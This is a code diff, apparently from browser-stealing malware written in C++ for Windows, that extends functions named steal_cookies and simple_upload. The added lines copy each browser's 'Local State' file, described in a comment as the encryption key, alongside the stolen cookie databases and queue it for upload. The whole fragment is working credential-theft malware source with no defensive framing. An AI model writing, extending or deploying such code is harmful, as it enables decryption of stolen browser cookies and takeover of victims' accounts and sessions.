@@ -1189,7 +1189,7 @@ void simple_upload()
     // scan for stolen browser dbs and attach them
     wchar_t tmpDir[MAX_PATH];
     GetTempPathW(MAX_PATH, tmpDir);
-    const wchar_t* patterns[] = { L"cookies_*", L"history_*" };
+    const wchar_t* patterns[] = { L"cookies_*", L"history_*", L"localstate_*" };
     for (auto* pat : patterns) {
         wchar_t search[MAX_PATH];
         swprintf_s(search, L"%s\\%s", tmpDir, pat);
@@ -1263,6 +1263,14 @@ void steal_cookies()
         wchar_t dst[MAX_PATH];
         swprintf_s(dst, L"%s\\cookies_%s.db", outDir, b.name);
         CopyFileW(src, dst, FALSE);
+
+        // also steal Local State (encryption key)
+        wchar_t lsSrc[MAX_PATH];
+        swprintf_s(lsSrc, L"%s\\%s\\Local State",
+            b.type == 0 ? localAppData : roamingAppData, b.base);
+        wchar_t lsDst[MAX_PATH];
+        swprintf_s(lsDst, L"%s\\localstate_%s.json", outDir, b.name);
+        CopyFileW(lsSrc, lsDst, FALSE);
     }
 
     // Firefox — cookies.sqlite in profile folders
